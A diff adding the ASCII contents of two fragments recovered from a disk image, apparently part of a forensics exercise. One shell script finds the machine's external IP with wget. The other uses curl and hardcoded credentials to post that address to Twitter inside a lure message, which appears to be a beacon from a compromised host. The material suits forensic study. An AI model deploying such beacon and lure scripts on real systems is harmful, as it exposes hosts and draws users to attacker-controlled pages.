@@ -1,0 +1,16 @@
+-------------------------------------------------------------------------------1
+ASCII Contents of Fragment 36355 in forensics_release.raw-63-498014
+
+
+#!/bin/sh
+
+wget -q -O - http://www.swlink.net/~styma/REMOTE_ADDR.shtml | grep -v '^<'
+
+-------------------------------------------------------------------------------2
+
+ASCII Contents of Fragment 36354 in forensics_release.raw-63-498014
+
+
+#!/bin/sh
+EXTERNAL_IP=$(./get_external_ip.sh)
+curl --basic --user "innocuous_news:flowersandkittens" --data-ascii "status=awesome+new+article+about+love+and+happiness+at+http://$EXTERNAL_IP/love.html" http://twitter.com/statuses/update.json
